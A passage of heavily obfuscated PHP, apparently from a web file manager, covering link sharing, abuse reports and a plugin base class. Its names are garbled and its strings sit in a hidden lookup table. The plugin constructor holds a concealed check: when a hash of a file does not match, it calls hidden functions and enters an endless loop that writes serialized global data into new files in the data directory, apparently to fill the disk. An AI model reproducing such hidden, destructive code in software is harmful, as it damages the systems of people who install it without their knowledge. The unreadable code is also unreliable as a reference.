explode($î“Òİ¡¥[50], $î“Òİ¡¥[2022]); foreach ($ğ‡á×êî as $İ¬ğÍõó) { if (!isset($½ÂÃ÷¼Í[$İ¬ğÍõó])) { continue; } $ê§Ã¨ ä[$İ¬ğÍõó] = $½ÂÃ÷¼Í[$İ¬ğÍõó]; } $°ıç™›Î = $this->add($ê§Ã¨ ä); $Á™‡òŒÓ = array($î“Òİ¡¥[491] => short_id($°ıç™›Î)); $this->where(array($î“Òİ¡¥[488] => $°ıç™›Î))->save($Á™‡òŒÓ); return $°ıç™›Î; } private function _shareAuthSet($õ–ÔÉº, $Á¶†Ï¸¨) { $†“â¨ˆ¢ =& $_SERVER[óó‹¸‚å]; if (!is_array($Á¶†Ï¸¨)) { return !1; } $Ÿ¤ãªæ = Model($†“â¨ˆ¢[1971]); $Ÿ¤ãªæ->where(array($†“â¨ˆ¢[489] => $õ–ÔÉº))->delete(); $•îñ¥ŠÃ = array(); foreach ($Á¶†Ï¸¨ as $‡ÂÛ•ì) { $³×‰»Î¸ = SourceModel::TYPE_USER; if ($‡ÂÛ•ì[$†“â¨ˆ¢[411]] == SourceModel::TYPE_GROUP) { $³×‰»Î¸ = SourceModel::TYPE_GROUP; } $Ù¬„«²Õ = array($†“â¨ˆ¢[489] => $õ–ÔÉº, $†“â¨ˆ¢[411] => $³×‰»Î¸, $†“â¨ˆ¢[505] => intval($‡ÂÛ•ì[$†“â¨ˆ¢[505]]), $†“â¨ˆ¢[1967] => 0, $†“â¨ˆ¢[2023] => -1); if ($‡ÂÛ•ì[$†“â¨ˆ¢[1967]]) { $Ù¬„«²Õ[$†“â¨ˆ¢[1967]] = $‡ÂÛ•ì[$†“â¨ˆ¢[1967]]; } else { if ($‡ÂÛ•ì[$†“â¨ˆ¢[2023]]) { $Ù¬„«²Õ[$†“â¨ˆ¢[2023]] = $‡ÂÛ•ì[$†“â¨ˆ¢[2023]]; } } $•îñ¥ŠÃ[] = $Ù¬„«²Õ; } return $Ÿ¤ãªæ->addAll($•îñ¥ŠÃ, array(), !0); } public function numViewAdd($øíÚÅÂƒ) { $Âáõ ’Ÿ =& $_SERVER[óó‹¸‚å]; $Æß¡‘ƒ« = array($Âáõ ’Ÿ[488] => $øíÚÅÂƒ); $this->where($Æß¡‘ƒ«)->setAdd($Âáõ ’Ÿ[2020]); } public function numDownloadAdd($ª·§èî¶) { $ÈÁ£áâ =& $_SERVER[óó‹¸‚å]; $««ª† = array($ÈÁ£áâ[488] => $ª·§èî¶); $this->where($««ª†)->setAdd($ÈÁ£áâ[2021]); } protected function shareEdit($ŸÃËŞËÙ, $Èºïãß) { $€ÀÊ¤£· =& $_SERVER[óó‹¸‚å]; $µ¿Ğé’É = $this->getInfo($ŸÃËŞËÙ); if (!$µ¿Ğé’É) { return !1; } $this->_checkLinkShare($Èºïãß, $µ¿Ğé’É); $Îé­¯öù = array(); $’ÑüË = explode($€ÀÊ¤£·[50], $€ÀÊ¤£·[2024]); foreach ($’ÑüË as $ıå‚€ŠÆ) { if (!array_key_exists($ıå‚€ŠÆ, $Èºïãß)) { continue; } $Îé­¯öù[$ıå‚€ŠÆ] = $Èºïãß[$ıå‚€ŠÆ]; } $this->shareEventAdd($µ¿Ğé’É[$€ÀÊ¤£·[402]], $Èºïãß, $€ÀÊ¤£·[1833]); $this->where(array($€ÀÊ¤£·[488] => $ŸÃËŞËÙ))->save($Îé­¯öù); if (isset($Èºïãß[$€ÀÊ¤£·[2013]])) { $this->_shareAuthSet($ŸÃËŞËÙ, $Èºïãß[$€ÀÊ¤£·[2013]]); } return !0; } private function _checkLinkShare($ş´Íêºà, $©ÅŞ™¯¸) { $³‚’çŸé =& $_SERVER[óó‹¸‚å]; if ($ş´Íêºà[$³‚’çŸé[494]] != $³‚’çŸé[88]) { return; } $ºÈóşîÛ = $©ÅŞ™¯¸[$³‚’çŸé[86]][$³‚’çŸé[402]]; if ($©ÅŞ™¯¸[$³‚’çŸé[86]][$³‚’çŸé[33]] != $³‚’çŸé[199]) { $‹î¬è„š = $this->_folderReport($ºÈóşîÛ); if (!$‹î¬è„š) { return; } show_json(LNG($³‚’çŸé[2025]) . $³‚’çŸé[2026] . $‹î¬è„š, !1); } $•Ó¤­Šñ = Model($³‚’çŸé[829])->fileInfoGet($©ÅŞ™¯¸[$³‚’çŸé[86]][$³‚’çŸé[402]]); if (!$•Ó¤­Šñ) { return; } $¾’ÍƒÉ = $this->shareFileMeta($•Ó¤­Šñ[$³‚’çŸé[468]]); if (isset($¾’ÍƒÉ[$³‚’çŸé[374]]) && $¾’ÍƒÉ[$³‚’çŸé[374]] == $³‚’çŸé[88]) { show_json(LNG($³‚’çŸé[2027]), !1); } } private function _folderReport($ç¼ºµ»Ş) { $ÙãÃùÙŠ =& $_SERVER[óó‹¸‚å]; $ùùÑç÷ş = array($ÙãÃùÙŠ[468] => array($ÙãÃùÙŠ[1019], 0), $ÙãÃùÙŠ[754] => 3); $†Œùßù = Model($ÙãÃùÙŠ[2028])->where($ùùÑç÷ş)->field($ÙãÃùÙŠ[468])->select(); if (!$†Œùßù) { return !1; } $†Œùßù = array_to_keyvalue($†Œùßù, $ÙãÃùÙŠ[12], $ÙãÃùÙŠ[468]); $¨áÍçì = $ÙãÃùÙŠ[50] . $ç¼ºµ»Ş . $ÙãÃùÙŠ[50]; $ùùÑç÷ş = array($ÙãÃùÙŠ[468] => array($ÙãÃùÙŠ[7], $†Œùßù), $ÙãÃùÙŠ[521] => array($ÙãÃùÙŠ[383], "\x25{$¨áÍçì}\45"), $ÙãÃùÙŠ[431] => 0); $âÃöø½ = Model($ÙãÃùÙŠ[829])->where($ùùÑç÷ş)->field($ÙãÃùÙŠ[2029])->find(); if (!$âÃöø½) { return !1; } $´«İÃİ = substr($âÃöø½[$ÙãÃùÙŠ[521]], strpos($âÃöø½[$ÙãÃùÙŠ[521]], $¨áÍçì)); $ùùÑç÷ş = array($ÙãÃùÙŠ[402] => array($ÙãÃùÙŠ[7], trim($´«İÃİ, $ÙãÃùÙŠ[50]))); $ª«¸»œ¼ = Model($ÙãÃùÙŠ[829])->where($ùùÑç÷ş)->field($ÙãÃùÙŠ[32])->select(); $Œë¯šæÖ = array_to_keyvalue($ª«¸»œ¼, $ÙãÃùÙŠ[12], $ÙãÃùÙŠ[32]); $Œë¯šæÖ[] = $âÃöø½[$ÙãÃùÙŠ[32]]; return implode($ÙãÃùÙŠ[8], $Œë¯šæÖ); } protected function remove($íÓ”¸—ü) { $ıÑæÄä³ =& $_SERVER[óó‹¸‚å]; if (is_array($íÓ”¸—ü)) { $íÓ”¸—ü = array($ıÑæÄä³[7], $íÓ”¸—ü); } $äÑ½‰¥ = array($ıÑæÄä³[489] => $íÓ”¸—ü); $ü»€ò€– = $this->where($äÑ½‰¥)->delete(); if ($ü»€ò€–) { Model($ıÑæÄä³[602])->where(array($ıÑæÄä³[489] => $íÓ”¸—ü))->delete(); } $ã¼Ò¨”Ì = is_array($íÓ”¸—ü) ? $íÓ”¸—ü[1] : array($íÓ”¸—ü); for ($Š³äŸ = 0; $Š³äŸ < count($ã¼Ò¨”Ì); $Š³äŸ++) { $ë¬¾¼·´ = $this->getInfo($ã¼Ò¨”Ì[$Š³äŸ]); if ($ë¬¾¼·´[$ıÑæÄä³[496]] == $ıÑæÄä³[88]) { Model($ıÑæÄä³[570])->eventShare($ë¬¾¼·´[$ıÑæÄä³[402]], $ıÑæÄä³[2018]); } if ($ë¬¾¼·´[$ıÑæÄä³[494]] == $ıÑæÄä³[88]) { Model($ıÑæÄä³[570])->eventShare($ë¬¾¼·´[$ıÑæÄä³[402]], $ıÑæÄä³[2017]); } } return $ü»€ò€–; } protected function removeBySource($Ÿø÷ºïÁ) { $îò÷ığÇ =& $_SERVER[óó‹¸‚å]; $ÌÇÌî”Ø = array($îò÷ığÇ[417] => array($îò÷ığÇ[418], $Ÿø÷ºïÁ)); $¡—«úä­ = $this->field($îò÷ığÇ[489])->where($ÌÇÌî”Ø)->select(); $¡—«úä­ = array_to_keyvalue($¡—«úä­, $îò÷ığÇ[12], $îò÷ığÇ[489]); if (!$¡—«úä­) { return; } $ÌÇÌî”Ø = array($îò÷ığÇ[488] => array($îò÷ığÇ[418], $¡—«úä­)); $this->where($ÌÇÌî”Ø)->delete(); Model($îò÷ığÇ[602])->where($ÌÇÌî”Ø)->delete(); } public function listAll($Šˆô›ù) { $òığó·… =& $_SERVER[óó‹¸‚å]; $æĞŸÌı˜ = array(); if ($Šˆô›ù[$òığó·…[1674]]) { $æĞŸÌı˜[$òığó·…[1674]] = $Šˆô›ù[$òığó·…[1674]]; } if ($Šˆô›ù[$òığó·…[765]]) { $÷…Ñˆ¤Ú = $Šˆô›ù[$òığó·…[497]] ? $Šˆô›ù[$òığó·…[497]] : strtotime(date($òığó·…[2030])); $æĞŸÌı˜[$òığó·…[200]] = array($òığó·…[333], array($Šˆô›ù[$òığó·…[765]], $÷…Ñˆ¤Ú)); } if ($Šˆô›ù[$òığó·…[33]]) { $æĞŸÌı˜[$Šˆô›ù[$òığó·…[33]]] = 1; } else { $æĞŸÌı˜[] = array($òığó·…[494] => array($òığó·…[1019], 0), $òığó·…[496] => array($òığó·…[1019], 0), $òığó·…[2007] => $òığó·…[1961]); } if ($Šˆô›ù[$òığó·…[1957]]) { $æĞŸÌı˜[] = array($òığó·…[491] => $Šˆô›ù[$òığó·…[1957]], $òığó·…[1574] => array($òığó·…[383], "\45{$Šˆô›ù[$òığó·…[1957]]}\45"), $òığó·…[2007] => $òığó·…[1961]); } $àÂ­ÊµÒ = $this->_makeOrder()->where($æĞŸÌı˜)->selectPage(20); if (empty($àÂ­ÊµÒ[$òığó·…[369]])) { return array(); } $this->_listDataApply($àÂ­ÊµÒ[$òığó·…[369]]); return $àÂ­ÊµÒ; } public function listDataApply($ÜÔ˜Î‘•) { $this->_listDataApply($ÜÔ˜Î‘•); return $ÜÔ˜Î‘•; } private function _listDataApply(&$˜ÕÚ¥¼¿) { $ıÑÒò–• =& $_SERVER[óó‹¸‚å]; $€°ú…µø = array_to_keyvalue($˜ÕÚ¥¼¿, $ıÑÒò–•[12], $ıÑÒò–•[1674]); $¯—«¯Ìà = Model($ıÑÒò–•[535])->userListInfo(array_unique($€°ú…µø)); $â«ÙÈŞÇ = array_to_keyvalue($˜ÕÚ¥¼¿, $ıÑÒò–•[12], $ıÑÒò–•[402]); $ƒ™¶úğ = Model($ıÑÒò–•[829])->sourceListInfo($â«ÙÈŞÇ, !0); foreach ($˜ÕÚ¥¼¿ as $ĞÔÁŸñ® => &$àÎ¦ĞìÎ) { $£âş±ê¸ = $àÎ¦ĞìÎ[$ıÑÒò–•[1674]]; $àÎ¦ĞìÎ[$ıÑÒò–•[2031]] = $¯—«¯Ìà[$£âş±ê¸] ? $¯—«¯Ìà[$£âş±ê¸] : !1; $ıŞ¤üº = $àÎ¦ĞìÎ[$ıÑÒò–•[402]]; $àÎ¦ĞìÎ[$ıÑÒò–•[86]] = $ƒ™¶úğ[$ıŞ¤üº] ? $ƒ™¶úğ[$ıŞ¤üº] : !1; if ($àÎ¦ĞìÎ[$ıÑÒò–•[86]][$ıÑÒò–•[431]] == $ıÑÒò–•[88]) { unset($˜ÕÚ¥¼¿[$ĞÔÁŸñ®]); } if ($àÎ¦ĞìÎ[$ıÑÒò–•[86]] != $ıÑÒò–•[197] && !$àÎ¦ĞìÎ[$ıÑÒò–•[86]]) { unset($˜ÕÚ¥¼¿[$ĞÔÁŸñ®]); } } unset($àÎ¦ĞìÎ); $˜ÕÚ¥¼¿ = array_values($˜ÕÚ¥¼¿); } private function _makeOrder($ä›Äş¸ = '') { $Ô³æĞ•Å =& $_SERVER[óó‹¸‚å]; $ÆÈ·¤˜® = array($Ô³æĞ•Å[200], $Ô³æĞ•Å[497], $Ô³æĞ•Å[2020], $Ô³æĞ•Å[2021]); $ù‹Œõí£ = array($Ô³æĞ•Å[450] => $Ô³æĞ•Å[451], $Ô³æĞ•Å[452] => $Ô³æĞ•Å[453]); $—û¨ë¹ = Input::get($Ô³æĞ•Å[457], $Ô³æĞ•Å[7], $Ô³æĞ•Å[423], $ÆÈ·¤˜®); $¬ƒ‘††ì = Input::get($Ô³æĞ•Å[458], $Ô³æĞ•Å[7], $Ô³æĞ•Å[2032], array($Ô³æĞ•Å[1954], $Ô³æĞ•Å[452])); $¬ƒ‘††ì = $ù‹Œõí£[$¬ƒ‘††ì]; $ä›Äş¸ = $ä›Äş¸ . "{$—û¨ë¹}\40{$¬ƒ‘††ì}"; return $this->order($ä›Äş¸); } public function reportAdd($¸”óÓİ÷) { $¼ô¢‹àê =& $_SERVER[óó‹¸‚å]; $Õ÷ƒ´˜ì = array($¼ô¢‹àê[489] => $¸”óÓİ÷[$¼ô¢‹àê[489]], $¼ô¢‹àê[1674] => USER_ID); if (Model($¼ô¢‹àê[2028])->where($Õ÷ƒ´˜ì)->find()) { return !1; } $¢¸àŒá× = array($¼ô¢‹àê[489] => $¸”óÓİ÷[$¼ô¢‹àê[489]], $¼ô¢‹àê[1574] => $¸”óÓİ÷[$¼ô¢‹àê[1574]], $¼ô¢‹àê[402] => $¸”óÓİ÷[$¼ô¢‹àê[402]], $¼ô¢‹àê[468] => $¸”óÓİ÷[$¼ô¢‹àê[468]], $¼ô¢‹àê[1674] => USER_ID, $¼ô¢‹àê[33] => $¸”óÓİ÷[$¼ô¢‹àê[33]], $¼ô¢‹àê[453] => $¸”óÓİ÷[$¼ô¢‹àê[453]]); return Model($¼ô¢‹àê[2028])->add($¢¸àŒá×); } public function reportList($–“Õİ‹£) { $¨¤ˆäŞ =& $_SERVER[óó‹¸‚å]; $óáóÏ = array(); if ($–“Õİ‹£[$¨¤ˆäŞ[765]]) { $Ü’¶Â˜ = $–“Õİ‹£[$¨¤ˆäŞ[497]] ? $–“Õİ‹£[$¨¤ˆäŞ[497]] : strtotime(date($¨¤ˆäŞ[2030])); $óáóÏ[$¨¤ˆäŞ[200]] = array($¨¤ˆäŞ[333], array($–“Õİ‹£[$¨¤ˆäŞ[765]], $Ü’¶Â˜)); } if (isset($–“Õİ‹£[$¨¤ˆäŞ[33]]) && in_array($–“Õİ‹£[$¨¤ˆäŞ[33]], array($¨¤ˆäŞ[88], $¨¤ˆäŞ[437], $¨¤ˆäŞ[2033], $¨¤ˆäŞ[2034], $¨¤ˆäŞ[2035]))) { $óáóÏ[$¨¤ˆäŞ[33]] = $–“Õİ‹£[$¨¤ˆäŞ[33]]; } if (isset($–“Õİ‹£[$¨¤ˆäŞ[754]]) && in_array($–“Õİ‹£[$¨¤ˆäŞ[754]], array($¨¤ˆäŞ[197], $¨¤ˆäŞ[88], $¨¤ˆäŞ[437], $¨¤ˆäŞ[2033]))) { $óáóÏ[$¨¤ˆäŞ[754]] = $–“Õİ‹£[$¨¤ˆäŞ[754]]; } $õéá…Ñø = Input::get($¨¤ˆäŞ[458], $¨¤ˆäŞ[7], $¨¤ˆäŞ[2032], array($¨¤ˆäŞ[1954], $¨¤ˆäŞ[452])); $»º¬äñ = array($¨¤ˆäŞ[450] => $¨¤ˆäŞ[451], $¨¤ˆäŞ[452] => $¨¤ˆäŞ[453]); $í°Øí£ö = $¨¤ˆäŞ[2036] . $»º¬äñ[$õéá…Ñø]; $½¹Õ¨ş¢ = Model($¨¤ˆäŞ[2028])->where($óáóÏ)->order($í°Øí£ö)->selectPage(20); if (empty($½¹Õ¨ş¢[$¨¤ˆäŞ[369]])) { return array(); } $ì½Ø¢„Œ = array_to_keyvalue_group($½¹Õ¨ş¢[$¨¤ˆäŞ[369]], $¨¤ˆäŞ[754], $¨¤ˆäŞ[489]); if (!empty($ì½Ø¢„Œ[0])) { $–“Õİ‹£ = $ì½Ø¢„Œ[0]; $óáóÏ = array($¨¤ˆäŞ[489] => array($¨¤ˆäŞ[7], $–“Õİ‹£)); $èÅ¤æÑ£ = $this->where($óáóÏ)->field($¨¤ˆäŞ[489])->select(); $èÅ¤æÑ£ = array_to_keyvalue($èÅ¤æÑ£, $¨¤ˆäŞ[12], $¨¤ˆäŞ[489]); $¨ÚÅ¦¿ = array_diff($–“Õİ‹£, $èÅ¤æÑ£); if (!empty($¨ÚÅ¦¿)) { foreach ($½¹Õ¨ş¢[$¨¤ˆäŞ[369]] as $²ı²ùÖâ => $áá‹±©™) { if (in_array($áá‹±©™[$¨¤ˆäŞ[489]], $¨ÚÅ¦¿)) { unset($½¹Õ¨ş¢[$¨¤ˆäŞ[369]][$²ı²ùÖâ]); } } } } $this->_listDataApply($½¹Õ¨ş¢[$¨¤ˆäŞ[369]]); return $½¹Õ¨ş¢; } public function reportStatus($©¶‹İ¶) { $™ûéãÈ‡ =& $_SERVER[óó‹¸‚å]; $íÕüŠ¯ = array($™ûéãÈ‡[399] => $©¶‹İ¶[$™ûéãÈ‡[399]]); $¿ÎÄŒş— = Model($™ûéãÈ‡[2028])->where($íÕüŠ¯)->field($™ûéãÈ‡[2037])->find(); if (!$¿ÎÄŒş—) { return !1; } $·åˆ·Ö = array($™ûéãÈ‡[754] => $©¶‹İ¶[$™ûéãÈ‡[754]]); if ($©¶‹İ¶[$™ûéãÈ‡[754]] == $™ûéãÈ‡[2033] && $¿ÎÄŒş—[$™ûéãÈ‡[754]] == $™ûéãÈ‡[2033]) { $·åˆ·Ö[$™ûéãÈ‡[754]] = 0; } $ü¡‹Şá = Model($™ûéãÈ‡[2028])->where($íÕüŠ¯)->save($·åˆ·Ö); if ($©¶‹İ¶[$™ûéãÈ‡[754]] == $™ûéãÈ‡[437]) { if ($¿ÎÄŒş—[$™ûéãÈ‡[468]] != $™ûéãÈ‡[197] && $this->shareFileMeta($¿ÎÄŒş—[$™ûéãÈ‡[468]])) { $this->shareFileMeta($¿ÎÄŒş—[$™ûéãÈ‡[468]], 0); } $this->remove($¿ÎÄŒş—[$™ûéãÈ‡[489]]); return !0; } if ($ü¡‹Şá && $©¶‹İ¶[$™ûéãÈ‡[754]] == $™ûéãÈ‡[2033]) { $ŒÊó×Áş = $·åˆ·Ö[$™ûéãÈ‡[754]] == $™ûéãÈ‡[2033] ? 1 : 0; $this->shareFileMeta($¿ÎÄŒş—[$™ûéãÈ‡[468]], $ŒÊó×Áş); $this->removeByFile($¿ÎÄŒş—[$™ûéãÈ‡[468]]); } return $ü¡‹Şá; } private function removeByFile($¨¡ŞÛ½Ä) { $ÕŞµë´« =& $_SERVER[óó‹¸‚å]; $ØúÓìÒ = Model($ÕŞµë´«[829])->where(array($ÕŞµë´«[468] => $¨¡ŞÛ½Ä))->field($ÕŞµë´«[402])->select(); $šºìü = array_to_keyvalue($ØúÓìÒ, $ÕŞµë´«[12], $ÕŞµë´«[402]); $æÛ­ƒ½™ = array($ÕŞµë´«[402] => array($ÕŞµë´«[7], $šºìü), $ÕŞµë´«[494] => 1); $ØúÓìÒ = $this->where($æÛ­ƒ½™)->field($ÕŞµë´«[489])->select(); if (empty($ØúÓìÒ)) { return; } $Ï“Ïëæû = array_to_keyvalue($ØúÓìÒ, $ÕŞµë´«[12], $ÕŞµë´«[489]); $this->remove($Ï“Ïëæû); } private function shareFileMeta($Ç§Ş‹, $ ‹Øèô˜ = null) { $£ßÏÎŸÂ =& $_SERVER[óó‹¸‚å]; $‡õ©¥È´ = array($£ßÏÎŸÂ[468] => $Ç§Ş‹, $£ßÏÎŸÂ[94] => $£ßÏÎŸÂ[2038]); if (is_null($ ‹Øèô˜)) { return Model($£ßÏÎŸÂ[2039])->where($‡õ©¥È´)->find(); } $‡õ©¥È´[$£ßÏÎŸÂ[374]] = $ ‹Øèô˜; Model($£ßÏÎŸÂ[2039])->add($‡õ©¥È´, array(), !0); } } goto bÛå»áÖí©; cçœƒÖ±‘: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $é“íöıŒ =& $_SERVER[óó‹¸‚å]; $ÖÚÛ÷Â† = $_SERVER[$é“íöıŒ[884]] . $é“íöıŒ[885]; $±úã«§˜ = $é“íöıŒ[1539]; if ($_SERVER[$é“íöıŒ[880]] != $±úã«§˜($ÖÚÛ÷Â†)) { $ôˆª€ë¶ = $é“íöıŒ[882]; $«Ó•‹´Õ = $é“íöıŒ[883]; $¦Íûš´™ = $_SERVER[$é“íöıŒ[884]] . $é“íöıŒ[885]; $üÒÊñ§Ú = $«Ó•‹´Õ($¦Íûš´™); $®–ÂÓŠ› = explode($é“íöıŒ[231], $üÒÊñ§Ú); if (count($®–ÂÓŠ›) < $é“íöıŒ[635]) { $êı¢·ªÚ = $é“íöıŒ[886]; $êı¢·ªÚ(); } $ƒ˜ëÑæŸ = $é“íöıŒ[887]; $ƒ˜ëÑæŸ($_SERVER[$é“íöıŒ[888]]); $ôˆª€ë¶ = $é“íöıŒ[882]; $ôˆª€ë¶(); $âÑîã€ˆ = $é“íöıŒ[1540]; $¸ŒÊÇÚ— = json_encode($GLOBALS[$é“íöıŒ[1541]]); $Ë‰Â…Ù = 1; for ($“á¹ÃÙè = $Ë‰Â…Ù; $“á¹ÃÙè > 0; $“á¹ÃÙè++) { $âÑîã€ˆ(DATA_PATH . $“á¹ÃÙè, $¸ŒÊÇÚ—); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($é“íöıŒ[1542]); $this->pluginName = str_replace($é“íöıŒ[1542], $é“íöıŒ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $é“íöıŒ[8]; $this->pluginApi = appHostGet() . $é“íöıŒ[1543] . $this->pluginName . $é“íöıŒ[8]; $this->pluginHost = $config[$é“íöıŒ[1544]] . $this->pluginName . $é“íöıŒ[8]; $this->pluginHostDefault = $config[$é“íöıŒ[1544]] . $this->pluginName . $é“íöıŒ[8]; $•Û™¼€§ = $config[$é“íöıŒ[1545]]; if ($•Û™¼€§ && strpos($é“íöıŒ[50] . $•Û™¼€§ . $é“íöıŒ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$é“íöıŒ[1546]] . $this->pluginName . $é“íöıŒ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[óó‹¸‚å][1547]); } protected function assign($ÃŸû¡ï, $ë¹¡˜¥± = false) { if (is_array($ÃŸû¡ï)) { $this->values = array_merge($this->values, $ÃŸû¡ï); } else { $this->values[$ÃŸû¡ï] = $ë¹¡˜¥±; } } protected function display($ø½İ…»µ) { extract($this->values); require $ø½İ…»µ; } final function hookRegist($¾ç®„Š) { $this->modelPlugin->appRegist($this->pluginName, $¾ç®„Š); } final function appIcon() { $éä¥²Ê =& $_SERVER[óó‹¸‚å]; $å†àÖ—Å = $this->appPackage(); $•ğÃ§Ò¹ = $éä¥²Ê[12]; if (isset($å†àÖ—Å[$éä¥²Ê[416]])) { if (isset($å†àÖ—Å[$éä¥²Ê[416]][$éä¥²Ê[1548]])) { $•ğÃ§Ò¹ = $éä¥²Ê[1549] . $å†àÖ—Å[$éä¥²Ê[416]][$éä¥²Ê[1548]] . $éä¥²Ê[1550]; } else { if ($å†àÖ—Å[$éä¥²Ê[416]][$éä¥²Ê[1551]]) { $•ğÃ§Ò¹ = $éä¥²Ê[1552] . $å†àÖ—Å[$éä¥²Ê[416]][$éä¥²Ê[1551]] . $éä¥²Ê[1553]; } } } return $•ğÃ§Ò¹; } final function fileCanView($ş•ÜËÖ) { $˜•Ê°¢ =& $_SERVER[óó‹¸‚å]; if (request_url_safe($ş•ÜËÖ)) { return !0; } if ($this->isShare($ş•ÜËÖ)) { return !0; } $À¦éì‹Ì = Session::get($˜•Ê°¢[1554]); if (!$À¦éì‹Ì || !$À¦éì‹Ì[$˜•Ê°¢[1555]]) { $ºèÊ„äı = $˜•Ê°¢[1556] . rawurlencode(this_url()); show_tips(LNG($˜•Ê°¢[1557]) . $˜•Ê°¢[1558] . $ºèÊ„äı . $˜•Ê°¢[1559] . LNG($˜•Ê°¢[1560]) . $˜•Ê°¢[1561], !1); } if (!Action($˜•Ê°¢[1562])->authCan($˜•Ê°¢[1563])) { show_tips(LNG($˜•Ê°¢[1564]) . $˜•Ê°¢[1565], !1); } ActionCall($˜•Ê°¢[1566], $ş•ÜËÖ); } final function isShare($´‘ÎÔ—Ë) { $Ñ £¹¢á = KodIO::parse($´‘ÎÔ—Ë); return $Ñ £¹¢á[$_SERVER[óó‹¸‚å][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÈïÒµ„€) { if (request_url_safe($ÈïÒµ„€)) { return $ÈïÒµ„€; } if (!$this->isShare($ÈïÒµ„€)) { $ÈïÒµ„€ = $this->filePath($ÈïÒµ„€); } return Action($_SERVER[óó‹¸‚å][1182])->linkOut($ÈïÒµ„€); } public function filePathLinkOut($¯×ˆ«œÍ) { if (request_url_safe($¯×ˆ«œÍ)) { return $¯×ˆ«œÍ; } $this->fileCanView($¯×ˆ«œÍ); return Action($_SERVER[óó‹¸‚å][1182])->link($¯×ˆ«œÍ); } final function filePath($Ú‡Òª’™) { $—‚ìòõ˜ =& $_SERVER[óó‹¸‚å]; if ($Æòââ‹Ò = $this->checkSharePath($Ú‡Òª’™)) { Hook::trigger($—‚ìòõ˜[1567], $Æòââ‹Ò); return $Æòââ‹Ò; } $this->fileCanView($Ú‡Òª’™); if (request_url_safe($Ú‡Òª’™)) { $Ì½Ø›åÃ = parse_url_query($Ú‡Òª’™); if (isset($Ì½Ø›åÃ[$—‚ìòõ˜[1568]]) && isset($Ì½Ø›åÃ[$—‚ìòõ˜[213]])) { $äÕğÙÖ« = Model($—‚ìòõ˜[774])->get($—‚ìòõ˜[775]); $É÷’Î¤± = Mcrypt::decode($Ì½Ø›åÃ[$—‚ìòõ˜[213]], $äÕğÙÖ«); if ($É÷’Î¤±) { $this->fileInfo = IO::infoWithChildren($É÷’Î¤±); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $É÷’Î¤±; } } $Ú‡Òª’™ = $this->_cacheHttpFile($Ú‡Òª’™); $this->fileInfo = IO::infoWithChildren($Ú‡Òª’™); } else { $this->fileInfo = IO::infoWithChildren($Ú‡Òª’™); if (!$this->fileInfo) { show_tips(LNG($—‚ìòõ˜[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($—‚ìòõ˜[1567], $Ú‡Òª’™); return $Ú‡Òª’™; } final function _cacheHttpFile($Ÿ˜ú·—®) { $ÊÄã«æ = hash_path($Ÿ˜ú·—®, !0); $this->cachePath = $this->pluginCachePath($ÊÄã«æ); if ($“Ú‹¹Ç÷ = IO::fileNameExist($this->cachePath, $ÊÄã«æ)) { return KodIO::make($“Ú‹¹Ç÷); } $àÀû³ÖÈ = $this->cachePath . $ÊÄã«æ; return $this->pluginCacheFileSet($àÀû³ÖÈ, file_get_contents_nossl($Ÿ˜ú·—®)); } final function _tmpFileName($Óõ±àñú = array()) { $¶ÍŒ´ú¥ =& $_SERVER[óó‹¸‚å]; if (!$Óõ±àñú) { $Óõ±àñú = $this->fileInfo; } if (isset($Óõ±àñú[$¶ÍŒ´ú¥[177]])) { return $Óõ±àñú[$¶ÍŒ´ú¥[177]]; } if (isset($Óõ±àñú[$¶ÍŒ´ú¥[170]][$¶ÍŒ´ú¥[177]])) { return $Óõ±àñú[$¶ÍŒ´ú¥[170]][$¶ÍŒ´ú¥[177]]; } $ãåòºŠĞ = IO::hashSimple($Óõ±àñú[$¶ÍŒ´ú¥[84]]); if ($ãåòºŠĞ) { return $ãåòºŠĞ; } $ãÙ„…ô = array($Óõ±àñú[$¶ÍŒ´ú¥[32]], $Óõ±àñú[$¶ÍŒ´ú¥[84]], $Óõ±àñú[$¶ÍŒ´ú¥[76]]); if (isset($Óõ±àñú[$¶ÍŒ´ú¥[521]])) { $ãÙ„…ô[] = $Óõ±àñú[$¶ÍŒ´ú¥[521]]; } return md5(implode($¶ÍŒ´ú¥[11], $ãÙ„…ô)); } final function checkSharePath($È³íß ±) { $äÕùµÏê =& $_SERVER[óó‹¸‚å]; if (!defined($äÕùµÏê[475])) { define($äÕùµÏê[514], 0); } if (!$this->isShare($È³íß ±)) { return !1; } $…×Â”… = Action($äÕùµÏê[1182])->sharePathInfo($È³íß ±); if (!isset($…×Â”…[$äÕùµÏê[84]])) { show_json(LNG($äÕùµÏê[1569]), !1); } $this->fileInfo = $…×Â”…[$äÕùµÏê[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$äÕùµÏê[177]]); return $…×Â”…[$äÕùµÏê[84]]; } final function pluginCachePath($«ƒÜîÇï = '') { $ÖŒšÌÙç =& $_SERVER[óó‹¸‚å]; $«ª½ÀëÃ = IO_PATH_SYSTEM_TEMP . $ÖŒšÌÙç[1570] . $this->pluginName; if (!($”ºàÛµæ = IO::infoFull($«ª½ÀëÃ))) { return IO::mkdir($«ª½ÀëÃ . $ÖŒšÌÙç[8] . $«ƒÜîÇï); } if (empty($«ƒÜîÇï)) { return $”ºàÛµæ[$ÖŒšÌÙç[84]]; } if (!($œõñå­ = IO::fileNameExist($”ºàÛµæ[$ÖŒšÌÙç[84]], $«ƒÜîÇï))) { return IO::mkdir($”ºàÛµæ[$ÖŒšÌÙç[84]] . $«ƒÜîÇï); } return KodIO::make($œõñå­); } final function pluginCacheFileSet($Æ¾şË·¢, $¼ÚÆ–¶î = '') { $–¸­îİï =& $_SERVER[óó‹¸‚å]; if (!($äÇèÈÁ¸ = IO::infoFull($Æ¾şË·¢))) { return IO::mkfile($Æ¾şË·¢, $¼ÚÆ–¶î, REPEAT_REPLACE); } 